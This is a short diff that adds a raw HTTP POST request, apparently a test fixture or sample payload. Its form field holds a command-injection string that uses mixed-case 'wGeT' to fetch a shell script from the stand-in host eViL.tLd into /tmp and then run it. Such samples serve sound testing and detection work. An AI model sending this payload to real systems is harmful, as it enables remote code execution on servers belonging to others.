@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+Connection: close
+
+data=; wGeT hTtP://eViL.tLd/S.sH -o /TmP/s.Sh; Sh /TmP/s.Sh
